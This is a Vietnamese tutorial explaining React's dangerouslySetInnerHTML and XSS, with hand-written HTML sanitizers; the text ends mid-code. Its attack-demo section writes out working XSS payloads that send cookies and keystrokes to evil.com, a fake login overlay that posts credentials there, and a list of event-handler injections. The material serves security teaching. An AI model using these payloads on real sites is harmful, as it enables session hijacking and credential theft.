# dangerouslySetInnerHTML — Deep Dive!

> **Chủ đề**: What is dangerouslySetInnerHTML and why is it dangerous?
> **Ngôn ngữ**: Tiếng Việt — giải thích cực kỳ chi tiết!
> **Phương châm**: Tự viết lại bằng tay — KHÔNG dùng thư viện!

---

## Mục Lục

1. [§1. dangerouslySetInnerHTML Là Gì?](#1)
2. [§2. Tại Sao React Tạo Ra Prop Này?](#2)
3. [§3. Bên Trong React — Source Code Hoạt Động Thế Nào?](#3)
4. [§4. Tại Sao Nó "Dangerous"?](#4)
5. [§5. Tự Viết — Demo Các Cuộc Tấn Công!](#5)
6. [§6. Tự Viết — Safe dangerouslySetInnerHTML Wrapper!](#6)
7. [§7. Tự Viết — HTML Sanitizer Engine!](#7)
8. [§8. Các Use Case Thực Tế & Best Practices!](#8)
9. [§9. Alternatives — Không Dùng dangerouslySetInnerHTML!](#9)
10. [§10. Tổng Kết & Câu Hỏi Phỏng Vấn!](#10)

---

## §1. dangerouslySetInnerHTML Là Gì?

### 1.1. Định Nghĩa!

```
  dangerouslySetInnerHTML — ĐỊNH NGHĨA:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  dangerouslySetInnerHTML là một PROP đặc biệt         │
  │  trong React, cho phép bạn chèn RAW HTML              │
  │  trực tiếp vào DOM!                                    │
  │                                                        │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  CÁCH DÙNG:                                      │  │
  │  │                                                  │  │
  │  │  <div dangerouslySetInnerHTML={{                  │  │
  │  │    __html: '<b>Hello</b> <em>World</em>'         │  │
  │  │  }} />                                           │  │
  │  │                                                  │  │
  │  │  CHÚ Ý:                                          │  │
  │  │  ① Prop nhận một OBJECT, không phải string!      │  │
  │  │  ② Object phải có key "__html" (2 underscore!)   │  │
  │  │  ③ Giá trị __html là HTML string thô!            │  │
  │  │  ④ React sẽ dùng innerHTML để chèn!              │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  SO SÁNH VỚI CÁCH THƯỜNG:                              │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │                                                  │  │
  │  │  // ✅ Cách thường — React auto-escape:          │  │
  │  │  <div>{userInput}</div>                          │  │
  │  │  → React dùng createTextNode()                   │  │
  │  │  → HTML tags KHÔNG được parse!                   │  │
  │  │  → AN TOÀN!                                      │  │
  │  │                                                  │  │
  │  │  // ❌ dangerouslySetInnerHTML — KHÔNG escape:    │  │
  │  │  <div dangerouslySetInnerHTML={{__html: input}}/>│  │
  │  │  → React dùng innerHTML                          │  │
  │  │  → HTML tags ĐƯỢC parse!                         │  │
  │  │  → NGUY HIỂM!                                    │  │
  │  │                                                  │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 1.2. Tại Sao Tên "dangerously"?

```
  TẠI SAO ĐẶT TÊN "dangerously"?
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  React team CỐ TÌNH đặt tên DÀI và ĐÁNG SỢ:          │
  │                                                        │
  │  "dangerouslySetInnerHTML"                              │
  │   ↑                                                    │
  │   "dangerously" = MỘT LỜI CẢNH BÁO!                   │
  │                                                        │
  │  MỤC ĐÍCH:                                             │
  │  ① Khiến developer PHẢI DỪNG LẠI suy nghĩ!           │
  │  ② Dễ tìm trong code review (grep/search)!            │
  │  ③ Nhắc nhở PHẢI sanitize trước khi dùng!             │
  │  ④ Tạo "code smell" — flag cho reviewer!               │
  │                                                        │
  │  Dan Abramov (React core team):                        │
  │  "Tên prop này là một lời nhắc nhở rằng               │
  │   nó nguy hiểm và bạn cần audit code                  │
  │   xung quanh nó cẩn thận."                             │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §2. Tại Sao React Tạo Ra Prop Này?

### 2.1. Vấn Đề: Cần Render Raw HTML!

```
  TẠI SAO CẦN dangerouslySetInnerHTML?
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  CÓ NHỮNG TRƯỜNG HỢP PHẢI RENDER RAW HTML:            │
  │                                                        │
  │  ① CMS / Rich Text Editor:                             │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  WYSIWYG editors (TinyMCE, CKEditor, Quill...)  │  │
  │  │  → Output = HTML string                          │  │
  │  │  → "<h2>Title</h2><p>Nội dung <b>bold</b></p>"  │  │
  │  │  → PHẢI render đúng dạng HTML!                   │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ② Markdown → HTML:                                    │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  User viết Markdown → convert sang HTML          │  │
  │  │  → "# Hello" → "<h1>Hello</h1>"                 │  │
  │  │  → Cần render dạng HTML!                          │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ③ Email Templates:                                    │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  HTML email content từ server                    │  │
  │  │  → Render preview trong React app                │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ④ Legacy HTML Content:                                │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  Dữ liệu HTML cũ từ database                    │  │
  │  │  → Không thể convert sang React components      │  │
  │  │  → Phải render trực tiếp!                        │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ⑤ Third-party HTML widgets:                           │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  Embed code từ bên thứ 3                        │  │
  │  │  → Google Maps, quảng cáo, social embeds        │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 2.2. Tại Sao Không Dùng innerHTML Trực Tiếp?

```javascript
// ═══════════════════════════════════════════════════════════
// TẠI SAO REACT KHÔNG CHO DÙNG innerHTML TRỰC TIẾP?
// ═══════════════════════════════════════════════════════════

// ❌ CÁCH NÀY KHÔNG HOẠT ĐỘNG TRONG REACT:
function BadComponent() {
  return <div innerHTML="<b>Hello</b>" />;
  // → React KHÔNG hỗ trợ prop "innerHTML"!
  // → React sẽ set attribute innerHTML="<b>Hello</b>"
  // → Hiển thị text "<b>Hello</b>", KHÔNG parse HTML!
}

// ❌ CÁCH NÀY CŨNG KHÔNG HOẠT ĐỘNG:
function AlsoBadComponent() {
  return <div>{`<b>Hello</b>`}</div>;
  // → React auto-escape!
  // → Hiển thị text "<b>Hello</b>", KHÔNG parse HTML!
  // → Đây là CƠ CHẾ BẢO VỆ mặc định của React!
}

// ✅ CÁCH DUY NHẤT — dangerouslySetInnerHTML:
function WorkingComponent() {
  return <div dangerouslySetInnerHTML={{ __html: "<b>Hello</b>" }} />;
  // → React dùng innerHTML bên trong!
  // → Browser parse HTML → <b>Hello</b> → Bold text!
}

// ✅ HOẶC DÙNG REF (nhưng mất React benefits):
function RefComponent() {
  var ref = React.useRef(null);
  React.useEffect(function () {
    if (ref.current) {
      ref.current.innerHTML = "<b>Hello</b>";
    }
  }, []);
  return <div ref={ref} />;
  // → Hoạt động nhưng BYPASS React hoàn toàn!
  // → Không reconcile, không VDOM!
}
```

---

## §3. Bên Trong React — Source Code Hoạt Động Thế Nào?

### 3.1. React Xử Lý dangerouslySetInnerHTML!

```
  REACT INTERNAL — dangerouslySetInnerHTML FLOW:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  JSX:                                                   │
  │  <div dangerouslySetInnerHTML={{ __html: html }} />    │
  │       ↓                                                │
  │  ① React.createElement('div', {                        │
  │       dangerouslySetInnerHTML: { __html: html }        │
  │     })                                                 │
  │       ↓                                                │
  │  ② React Element Object:                                │
  │     {                                                  │
  │       $$typeof: Symbol(react.element),                 │
  │       type: 'div',                                     │
  │       props: {                                         │
  │         dangerouslySetInnerHTML: { __html: html }      │
  │       }                                                │
  │     }                                                  │
  │       ↓                                                │
  │  ③ ReactDOM Reconciler:                                 │
  │     → Kiểm tra prop "dangerouslySetInnerHTML"          │
  │     → Nếu tồn tại → gọi setInnerHTML()                │
  │       ↓                                                │
  │  ④ setInnerHTML(domElement, html):                      │
  │     → domElement.innerHTML = html;                     │
  │     → CHÈN HTML THÔ VÀO DOM!                           │
  │     → KHÔNG escape!                                    │
  │     → KHÔNG sanitize!                                  │
  │       ↓                                                │
  │  ⑤ Browser parse HTML:                                  │
  │     → Tạo DOM nodes từ HTML string                     │
  │     → Script/event handlers CÓ THỂ CHẠY!              │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 3.2. Tự Viết — Mô Phỏng React Internal!

```javascript
// ═══════════════════════════════════════════════════════════
// MÔ PHỎNG REACT XỬLÝ dangerouslySetInnerHTML!
// Đây là simplified version của React source code!
// ═══════════════════════════════════════════════════════════

function setInitialDOMProperties(domElement, props) {
  var propKeys = Object.keys(props);

  for (var i = 0; i < propKeys.length; i++) {
    var propKey = propKeys[i];
    var propValue = props[propKey];

    if (propKey === "dangerouslySetInnerHTML") {
      // ═══ ĐOẠN CODE QUAN TRỌNG! ═══
      // React xử lý đặc biệt cho prop này!

      // Bước 1: Validate format:
      if (propValue == null) continue;
      if (typeof propValue !== "object" || !("__html" in propValue)) {
        throw new Error(
          "dangerouslySetInnerHTML phải là object có key __html!",
        );
      }

      // Bước 2: Kiểm tra children conflicts:
      if (props.children != null) {
        throw new Error(
          "Không được dùng children cùng dangerouslySetInnerHTML!",
        );
      }

      // Bước 3: Set innerHTML TRỰC TIẾP:
      var htmlContent = propValue.__html;
      if (htmlContent != null) {
        domElement.innerHTML = htmlContent;
        // ↑ ĐOẠN NÀY LÀ LÝ DO NÓ "DANGEROUS"!
        // → innerHTML parse HTML thô!
        // → Script, event handlers, img onerror... ĐỀU CHẠY!
      }
    } else if (propKey === "children") {
      // Xử lý children bình thường:
      if (typeof propValue === "string") {
        domElement.textContent = propValue;
        // ↑ textContent = AN TOÀN!
        // → KHÔNG parse HTML!
      } else if (typeof propValue === "number") {
        domElement.textContent = "" + propValue;
      }
    } else if (propKey === "className") {
      domElement.setAttribute("class", propValue);
    } else if (propKey === "style") {
      var styleKeys = Object.keys(propValue);
      for (var j = 0; j < styleKeys.length; j++) {
        domElement.style[styleKeys[j]] = propValue[styleKeys[j]];
      }
    } else if (propKey.indexOf("on") === 0) {
      // Event handler:
      var eventName = propKey.substring(2).toLowerCase();
      domElement.addEventListener(eventName, propValue);
    } else {
      domElement.setAttribute(propKey, propValue);
    }
  }
}

// THỬ NGHIỆM — SO SÁNH:
var div1 = document.createElement("div");
var div2 = document.createElement("div");

// Cách 1: children (AN TOÀN):
setInitialDOMProperties(div1, {
  children: '<img src=x onerror=alert("XSS")>',
});
console.log(div1.innerHTML);
// → '&lt;img src=x onerror=alert("XSS")&gt;'
// → Hiển thị TEXT! ✅

// Cách 2: dangerouslySetInnerHTML (NGUY HIỂM):
setInitialDOMProperties(div2, {
  dangerouslySetInnerHTML: {
    __html: '<img src=x onerror=alert("XSS")>',
  },
});
console.log(div2.innerHTML);
// → '<img src=x onerror=alert("XSS")>'
// → Browser parse → img load fail → onerror → CHẠY JS! ❌
```

### 3.3. Tại Sao Dùng Object `{ __html: ... }`?

```
  TẠI SAO { __html: ... } MÀ KHÔNG PHẢI STRING?
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  React team CỐ TÌNH thiết kế API bất tiện:            │
  │                                                        │
  │  ❌ KHÔNG cho phép:                                     │
  │  <div dangerouslySetInnerHTML="<b>text</b>" />         │
  │                                                        │
  │  ✅ PHẢI viết dài dòng:                                 │
  │  <div dangerouslySetInnerHTML={{ __html: html }} />    │
  │                                                        │
  │  LÝ DO:                                                │
  │  ① BẮT BUỘC developer phải tạo object rõ ràng         │
  │     → Không thể vô tình truyền string thông thường     │
  │     → Phải CỐ Ý tạo { __html: '...' }                 │
  │                                                        │
  │  ② Key "__html" có double underscore                    │
  │     → Convention: "đây là internal/private"            │
  │     → Tạo cảm giác "không nên dùng"                   │
  │                                                        │
  │  ③ Dễ detect trong linting rules                        │
  │     → ESLint react/no-danger                           │
  │     → Grep "__html" để tìm tất cả                      │
  │                                                        │
  │  ④ Ngăn chặn lỗi vô tình:                              │
  │     → Nếu API trả về HTML string                       │
  │     → Không thể vô tình pass vào prop này              │
  │     → PHẢI wrap trong { __html: ... }                   │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §4. Tại Sao Nó "Dangerous"?

### 4.1. So Sánh: textContent vs innerHTML!

```
  textContent vs innerHTML — BẢN CHẤT:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Input: '<img src=x onerror=alert(1)>'                 │
  │                                                        │
  │  ┌─────────────────┐    ┌─────────────────────────┐   │
  │  │ textContent      │    │ innerHTML                │   │
  │  │ (React default)  │    │ (dangerouslySetHTML)     │   │
  │  ├─────────────────┤    ├─────────────────────────┤   │
  │  │ Tạo TEXT node    │    │ Tạo ELEMENT nodes       │   │
  │  │ nodeType = 3     │    │ nodeType = 1            │   │
  │  │ KHÔNG parse HTML │    │ CÓ parse HTML           │   │
  │  │ Hiển thị text    │    │ Thực thi code           │   │
  │  │                 │    │                         │   │
  │  │ DOM:             │    │ DOM:                     │   │
  │  │ └─ #text         │    │ └─ <img>                │   │
  │  │    "<img src=x   │    │    src="x"              │   │
  │  │     onerror=..." │    │    onerror=alert(1)     │   │
  │  │                 │    │    → JS CHẠY! ❌         │   │
  │  │ → AN TOÀN! ✅   │    │ → NGUY HIỂM! ❌         │   │
  │  └─────────────────┘    └─────────────────────────┘   │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 4.2. Danh Sách Nguy Hiểm!

```
  dangerouslySetInnerHTML — TẠI SAO NGUY HIỂM?
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ① XSS (Cross-Site Scripting):                         │
  │  → Hacker chèn <script>, <img onerror>, <svg onload>  │
  │  → Đánh cắp cookie, session, user data!               │
  │                                                        │
  │  ② Session Hijacking:                                  │
  │  → Chèn script đọc document.cookie                    │
  │  → Gửi cookie về server hacker!                        │
  │  → Hacker đăng nhập bằng session user!                │
  │                                                        │
  │  ③ Phishing:                                           │
  │  → Chèn form giả mạo (login form)                     │
  │  → User nhập email/password vào form giả!              │
  │  → Thông tin gửi cho hacker!                           │
  │                                                        │
  │  ④ Keylogging:                                         │
  │  → Chèn script capture keystrokes                     │
  │  → Ghi lại mọi thứ user gõ!                           │
  │                                                        │
  │  ⑤ Defacement:                                         │
  │  → Thay đổi nội dung trang web                        │
  │  → Hiển thị thông tin sai lệch!                        │
  │                                                        │
  │  ⑥ Cryptocurrency Mining:                              │
  │  → Chèn script đào coin                               │
  │  → Dùng CPU/GPU của user!                              │
  │                                                        │
  │  ⑦ Bypass React Security:                              │
  │  → Phá vỡ toàn bộ auto-escape của React!              │
  │  → $$typeof check KHÔNG CÒN TÁC DỤNG!                │
  │  → createTextNode() KHÔNG ĐƯỢC GỌI!                    │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §5. Tự Viết — Demo Các Cuộc Tấn Công!

```javascript
// ═══════════════════════════════════════════════════════════
// DEMO TẤN CÔNG QUA dangerouslySetInnerHTML!
// Minh họa tại sao nó nguy hiểm!
// ═══════════════════════════════════════════════════════════

// ① COOKIE THEFT — Đánh cắp cookie:
var attack1 =
  '<img src=x onerror="' +
  "new Image().src='https://evil.com/steal?c='+document.cookie" +
  '">';
// Khi render qua dangerouslySetInnerHTML:
// → img load fail → onerror chạy
// → Tạo Image request đến evil.com kèm cookie!
// → Hacker nhận được session cookie!

// ② PHISHING FORM — Form đăng nhập giả:
var attack2 =
  '<div style="position:fixed;top:0;left:0;' +
  "width:100%;height:100%;background:rgba(0,0,0,0.8);" +
  "z-index:99999;display:flex;align-items:center;" +
  'justify-content:center">' +
  '<div style="background:white;padding:40px;border-radius:8px">' +
  "<h2>Session hết hạn!</h2>" +
  '<form action="https://evil.com/phish" method="POST">' +
  '<input name="email" placeholder="Email" style="display:block;' +
  'margin:10px 0;padding:8px;width:250px"><br>' +
  '<input name="password" type="password" placeholder="Mật khẩu" ' +
  'style="display:block;margin:10px 0;padding:8px;width:250px"><br>' +
  '<button style="padding:10px 20px;background:#1877f2;color:white;' +
  'border:none;cursor:pointer">Đăng nhập lại</button>' +
  "</form></div></div>";
// → Overlay che toàn trang → User thấy form đăng nhập giả!
// → Nhập thông tin → POST đến evil.com!

// ③ KEYLOGGER — Ghi lại phím bấm:
var attack3 =
  '<img src=x onerror="' +
  "document.addEventListener('keypress',function(e){" +
  "new Image().src='https://evil.com/log?k='+e.key})" +
  '">';
// → Mọi phím user bấm → gửi về evil.com!
// → Password, credit card, tin nhắn...

// ④ DOM MANIPULATION — Thay đổi trang:
var attack4 =
  '<img src=x onerror="' +
  "document.querySelector('[class*=price]').textContent='$0.01'" +
  '">';
// → Thay đổi giá hiển thị trên trang!
// → User thấy giá sai → mua hàng nhầm!

// ⑤ SVG-BASED XSS — Tấn công qua SVG:
var attack5 =
  '<svg onload="alert(document.domain)">' + '<circle r="50" fill="red"/></svg>';
// → SVG hợp lệ nhưng chứa onload!
// → Browser parse SVG → chạy onload!

// ⑥ EVENT HANDLER VARIANTS — Nhiều cách chèn:
var attack6_list = [
  '<div onmouseover="alert(1)">Hover me</div>',
  '<details open ontoggle="alert(1)">XSS</details>',
  '<body onload="alert(1)">',
  '<input onfocus="alert(1)" autofocus>',
  '<marquee onstart="alert(1)">XSS</marquee>',
  '<video><source onerror="alert(1)"></video>',
  '<audio src=x onerror="alert(1)">',
];
// → Có RẤT NHIỀU event handlers có thể dùng!
// → Không chỉ onerror và onclick!
```

```
  DEMO TẤN CÔNG — SƠ ĐỒ:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Hacker input        dangerouslySetInnerHTML    Result  │
  │  ┌──────────┐       ┌──────────────────┐              │
  │  │<img      │       │                  │              │
  │  │ src=x    │──────→│  innerHTML =     │──→ XSS!     │
  │  │ onerror= │       │  raw HTML        │              │
  │  │ alert()> │       │                  │              │
  │  └──────────┘       └──────────────────┘              │
  │                                                        │
  │  ┌──────────┐       ┌──────────────────┐              │
  │  │<form     │       │                  │              │
  │  │ action=  │──────→│  innerHTML =     │──→ Phishing!│
  │  │ evil.com>│       │  raw HTML        │              │
  │  └──────────┘       └──────────────────┘              │
  │                                                        │
  │  ┌──────────┐       ┌──────────────────┐              │
  │  │<svg      │       │                  │              │
  │  │ onload=  │──────→│  innerHTML =     │──→ XSS!     │
  │  │ steal()> │       │  raw HTML        │              │
  │  └──────────┘       └──────────────────┘              │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §6. Tự Viết — Safe dangerouslySetInnerHTML Wrapper!

```javascript
// ═══════════════════════════════════════════════════════════
// SAFE WRAPPER — BỌC dangerouslySetInnerHTML AN TOÀN!
// Sanitize HTML trước khi render!
// ═══════════════════════════════════════════════════════════

function createSafeHTML(dirtyHtml, options) {
  options = options || {};

  // ① DEFAULT CONFIG:
  var config = {
    allowedTags: options.allowedTags || {
      b: true,
      i: true,
      em: true,
      strong: true,
      p: true,
      br: true,
      ul: true,
      ol: true,
      li: true,
      a: true,
      span: true,
      div: true,
      h1: true,
      h2: true,
      h3: true,
      h4: true,
      blockquote: true,
      code: true,
      pre: true,
      table: true,
      thead: true,
      tbody: true,
      tr: true,
      td: true,
      th: true,
    },
    allowedAttrs: options.allowedAttrs || {
      a: ["href", "title", "target"],
      img: ["src", "alt", "width", "height"],
      td: ["colspan", "rowspan"],
      th: ["colspan", "rowspan"],
      span: ["class"],
      div: ["class"],
      p: ["class"],
      code: ["class"],
    },
    // Tags BỊ XÓA HOÀN TOÀN (kể cả children):
    stripTags: options.stripTags || {
      script: true,
      style: true,
      iframe: true,
      object: true,
      embed: true,
      form: true,
      input: true,
      textarea: true,
      button: true,
      select: true,
      link: true,
      meta: true,
    },
  };

  // ② SANITIZE FUNCTION:
  function sanitize(html) {
    if (typeof html !== "string" || html.length === 0) {
      return "";
    }

    // Giới hạn độ dài (chống DoS):
    if (html.length > 100000) {
      html = html.substring(0, 100000);
    }

    // Parse bằng DOMParser (an toàn — không execute scripts):
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, "text/html");

    return processNode(doc.body);
  }

  // ③ PROCESS TỪNG NODE:
  function processNode(node) {
    var result = "";

    for (var i = 0; i < node.childNodes.length; i++) {
      var child = node.childNodes[i];

      // Text node → giữ nguyên (đã safe):
      if (child.nodeType === 3) {
        result += escapeTextContent(child.textContent);
        continue;
      }

      // Comment node → bỏ qua:
      if (child.nodeType === 8) continue;

      // Element node:
      if (child.nodeType === 1) {
        var tag = child.tagName.toLowerCase();

        // Strip tags — xóa hoàn toàn:
        if (config.stripTags[tag]) continue;

        // Allowed tags → giữ và sanitize attributes:
        if (config.allowedTags[tag]) {
          result += "<" + tag;
          result += sanitizeAttributes(child, tag);
          result += ">";

          // Self-closing tags:
          if (tag === "br" || tag === "img" || tag === "hr") {
            continue;
          }

          // Process children:
          result += processNode(child);
          result += "</" + tag + ">";
        } else {
          // Tag không allowed → chỉ lấy children text:
          result += processNode(child);
        }
      }
    }
    return result;
  }

  // ④ SANITIZE ATTRIBUTES:
  function sanitizeAttributes(element, tagName) {
    var result = "";
    var allowed = config.allowedAttrs[tagName] || [];

    for (var i = 0; i < element.attributes.length; i++) {
      var attr = element.attributes[i];
      var name = attr.name.toLowerCase();

      // Chặn event handlers (on*):
      if (name.indexOf("on") === 0) continue;

      // Chỉ cho phép attributes trong whitelist:
      var isAllowed = false;
      for (var j = 0; j < allowed.length; j++) {
        if (allowed[j] === name) {
          isAllowed = true;
          break;
        }
      }
      if (!isAllowed) continue;

      var value = attr.value;

      // Validate URL attributes (href, src):
      if (name === "href" || name === "src") {
        value = sanitizeURL(value);
        if (!value) continue;
      }

      // Escape attribute value:
      value = value
        .replace(/&/g, "&amp;")
        .replace(/"/g, "&quot;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");

      result += " " + name + '="' + value + '"';

      // Thêm rel="noopener noreferrer" cho links:
      if (name === "href" && tagName === "a") {
        result += ' rel="noopener noreferrer"';
      }
    }
    return result;
  }

  // ⑤ SANITIZE URL:
  function sanitizeURL(url) {
    if (!url) return "";
    url = url.replace(/[\t\n\r]/g, "");

    // Decode để detect hidden protocols:
    var decoded = url;
    try {
      decoded = decodeURIComponent(url);
    } catch (e) {}
    decoded = decoded.toLowerCase().replace(/\s/g, "");

    // Chặn dangerous protocols:
    if (
      decoded.indexOf("javascript:") === 0 ||
      decoded.indexOf("vbscript:") === 0 ||
      decoded.indexOf("data:") === 0
    ) {
      return "";
    }
    return url;
  }

  // ⑥ ESCAPE TEXT:
  function escapeTextContent(text) {
    return text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");
  }

  // ⑦ RETURN RESULT:
  var cleanHtml = sanitize(dirtyHtml);
  return { __html: cleanHtml };
}

// ═══ REACT COMPONENT — SAFE HTML RENDERER ═══
function SafeHTML(props) {
  var safeContent = createSafeHTML(props.html, props.options);
  return {
    $$typeof: Symbol.for("react.element"),
    type: props.tag || "div",
    props: {
      className: props.className || "safe-html",
      dangerouslySetInnerHTML: safeContent,
    },
  };
}

// THỬ NGHIỆM:
var dirty =
  "<h1>Title</h1>" +
  "<p>Safe <b>bold</b> text</p>" +
  '<script>alert("XSS")</script>' +
  "<img src=x onerror=alert(1)>" +
  '<a href="javascript:alert(1)">Click</a>' +
  '<a href="https://safe.com">Safe Link</a>' +
  '<form action="evil.com"><input></form>';

var result = createSafeHTML(dirty);
console.log(result.__html);
// → '<h1>Title</h1><p>Safe <b>bold</b> text</p>'
//   + '<a href="https://safe.com" rel="noopener noreferrer">Safe Link</a>'
// → script    → XÓA!
// → img onerror → XÓA (onerror bị strip)!
// → javascript: href → XÓA!
// → form/input → XÓA!
```

---

## §7. Tự Viết — HTML Sanitizer Engine!

```javascript
// ═══════════════════════════════════════════════════════════
// HTML SANITIZER ENGINE — NÂNG CAO!
// Sanitizer mạnh mẽ hơn với nhiều tính năng!
// ═══════════════════════════════════════════════════════════

function HTMLSanitizerEngine() {
  // ① CSS PROPERTY WHITELIST:
  var SAFE_CSS_PROPERTIES = {
    color: true,
    "background-color": true,
    "font-size": true,
    "font-weight": true,
    "font-style": true,
    "text-align": true,
    "text-decoration": true,
    margin: true,
    padding: true,
    border: true,
    width: true,
    height: true,
    "max-width": true,
    display: true,
    "line-height": true,
    "border-radius": true,
    opacity: true,
  };

  // ② CSS VALUE VALIDATOR:
  function isCSSValueSafe(property, value) {
    value = ("" + value).toLowerCase();
    // Chặn url() trong CSS (có thể leak data):
    if (value.indexOf("url(") !== -1) return false;
    // Chặn expression() (IE-specific XSS):
    if (value.indexOf("expression(") !== -1) return false;
    // Chặn javascript: trong CSS:
    if (value.indexOf("javascript:") !== -1) return false;
    // Chặn behavior (IE):
    if (value.indexOf("behavior") !== -1) return false;
    // Chặn -moz-binding (Firefox):
    if (value.indexOf("-moz-binding") !== -1) return false;
    return true;
  }

  // ③ SANITIZE INLINE STYLE:
  function sanitizeStyle(styleString) {
    if (!styleString) return "";
    var safe = [];
    var pairs = styleString.split(";");
    for (var i = 0; i < pairs.length; i++) {
      var pair = pairs[i].replace(/^\s+|\s+$/g, "");
      if (!pair) continue;

      var colonIdx = pair.indexOf(":");
      if (colonIdx === -1) continue;

      var prop = pair
        .substring(0, colonIdx)
        .replace(/^\s+|\s+$/g, "")
        .toLowerCase();
      var val = pair.substring(colonIdx + 1).replace(/^\s+|\s+$/g, "");

      if (SAFE_CSS_PROPERTIES[prop] && isCSSValueSafe(prop, val)) {
        safe.push(prop + ":" + val);
      }
    }
    return safe.join(";");
  }

  // ④ DETECT HIDDEN XSS PATTERNS:
  function hasHiddenXSS(html) {
    var warnings = [];
    // UTF-8 encoding tricks:
    if (/\\u[0-9a-fA-F]{4}/.test(html)) {
      warnings.push("Unicode escape sequences detected");
    }
    // HTML entities in event handlers:
    if (/on\w+\s*=\s*["']?[^"']*&#/.test(html)) {
      warnings.push("HTML entities in event handlers");
    }
    // Data URIs:
    if (/data\s*:/i.test(html)) {
      warnings.push("Data URI detected");
    }
    // Base64 content:
    if (/base64/i.test(html)) {
      warnings.push("Base64 content detected");
    }
    return warnings;
  }

  // ⑤ FULL SANITIZE:
  function sanitize(html, options) {
    options = options || {};
    if (typeof html !== "string") return { html: "", warnings: [] };

    var warnings = hasHiddenXSS(html);

    // Parse:
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, "text/html");

    // Clean:
    var cleanHTML = cleanElement(doc.body, options);

    return {
      html: cleanHTML,
      warnings: warnings,
      safe: warnings.length === 0,
    };
  }

  // ⑥ CLEAN ELEMENT (RECURSIVE):
  function cleanElement(node, options) {
    var result = "";
    var BLOCK_TAGS = {
      script: 1,
      style: 1,
      iframe: 1,
      object: 1,
      embed: 1,
      applet: 1,
      form: 1,
      input: 1,
      textarea: 1,
      select: 1,
      button: 1,
    };

    var ALLOW_TAGS = options.allowTags || {
      b: 1,
      i: 1,
      em: 1,
      strong: 1,
      u: 1,
      p: 1,
      br: 1,
      hr: 1,
      ul: 1,
      ol: 1,
      li: 1,
      a: 1,
      span: 1,
      div: 1,
      h1: 1,
      h2: 1,
      h3: 1,
      h4: 1,
      h5: 1,
      h6: 1,
      blockquote: 1,
      code: 1,
      pre: 1,
      table: 1,
      thead: 1,
      tbody: 1,
      tr: 1,
      td: 1,
      th: 1,
      img: 1,
      figure: 1,
      figcaption: 1,
      sup: 1,
      sub: 1,
      mark: 1,
      del: 1,
      ins: 1,
      abbr: 1,
    };

    for (var i = 0; i < node.childNodes.length; i++) {
      var child = node.childNodes[i];

      if (child.nodeType === 3) {
        result += child.textContent
          .replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;");
        continue;
      }
      if (child.nodeType !== 1) continue;

      var tag = child.tagName.toLowerCase();

      // Block tags → xóa hoàn toàn:
      if (BLOCK_TAGS[tag]) continue;

      // Allowed tags → sanitize:
      if (ALLOW_TAGS[tag]) {
        result += "<" + tag;

        // Sanitize attributes:
        for (var j = 0; j < child.attributes.length; j++) {
          var attr = child.attributes[j];
          var aName = attr.name.toLowerCase();

          // Block event handlers:
          if (aName.indexOf("on") === 0) continue;

          // Filter attributes per tag:
          if (aName === "href" && tag === "a") {
            var href = attr.value.replace(/[\t\n\r]/g, "");
            try {
              href = decodeURIComponent(href);
            } catch (e) {}
            if (/^\s*javascript:/i.test(href)) continue;
            result +=
              ' href="' +
              attr.value.replace(/&/g, "&amp;").replace(/"/g, "&quot;") +
              '"';
            result += ' rel="noopener noreferrer"';
          } else if (aName === "src" && tag === "img") {
            var src = attr.value.replace(/[\t\n\r]/g, "");
            if (/^\s*(javascript|data):/i.test(src)) continue;
            result +=
              ' src="' +
              attr.value.replace(/&/g, "&amp;").replace(/"/g, "&quot;") +
              '"';
          } else if (aName === "alt" || aName === "title") {
            result +=
              " " +
              aName +
              '="' +
              attr.value.replace(/&/g, "&amp;").replace(/"/g, "&quot;") +
              '"';
          } else if (aName === "class") {
            // Chỉ cho phép class names an toàn:
            var classes = attr.value.replace(/[^a-zA-Z0-9\s_-]/g, "");
            if (classes) result += ' class="' + classes + '"';
          } else if (aName === "style") {
            var safeStyle = sanitizeStyle(attr.value);
            if (safeStyle) result += ' style="' + safeStyle + '"';
          }
        }

        // Self-closing:
        if (tag === "br" || tag === "hr" || tag === "img") {
          result += " />";
        } else {
          result += ">";
          result += cleanElement(child, options);
          result += "</" + tag + ">";
        }
      } else {
        // Unknown tag → lấy text content only:
        result += cleanElement(child, options);
      }
    }
    return result;
  }

  return {
    sanitize: sanitize,
    sanitizeStyle: sanitizeStyle,
    hasHiddenXSS: hasHiddenXSS,
  };
}

// THỬ NGHIỆM:
var engine = HTMLSanitizerEngine();

var dirty =
  "<h1>Title</h1>" +
